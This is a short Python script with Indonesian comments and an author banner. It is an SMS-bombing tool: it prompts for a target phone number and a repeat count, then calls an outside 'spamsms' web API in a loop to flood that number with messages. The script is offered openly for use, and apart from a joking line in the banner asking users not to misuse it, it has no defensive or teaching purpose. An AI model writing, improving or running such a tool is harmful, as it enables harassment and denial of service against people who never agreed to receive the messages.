# wih kepo
# mau copas? sertakan nama author
# Fb : Ren sydcate
# ig : ren7_
# yt : Ren7 Sydcate

import requests, os

def logo():
  print("""
   ..............
               ..,;:ccc,.
             ......''';lxO.                        
   .....''''..........,:ld;                         
             .';;;:::;,,.x,                        
         ..'''.            0Xxoc:,.  ...            
    ....                ,ONkc;,;cokOdc',.          
   .                   OMo           ':ddo.        
                       dMc               :OO;       
                       0M.                 .:o.     
                       ;Wd                          
                        ;XO,
                          ,d0Odlc;,..
                              ..',;:cdOOd::,.
                                       .:d;.':;.
                                          'd,  .'
                                            ;l   ..
                                             .o
                                              c
                                               .'
                                               .
                       Author : Ren7(Ninym)
               github : https://github.com/CalonSukses1
                   Note : Jangn buat jahil anjing
""")

def menu():
  os.system('clear')
  logo()
  print("\nMasukan Nomer Target Tod")
  nomor = input("Nomer Target : ")
  jum = int(input("Jumlah : "))
  for i in range(jum):
      req = requests.get("https://ainxbot-sms.herokuapp.com/api/spamsms",params={"phone":nomor}).text
      if 'terkirim' in req:
           print("\nSpam Terkirim")
      else:
           print("\nSpam Gagal")
           os.system('clear')

menu()
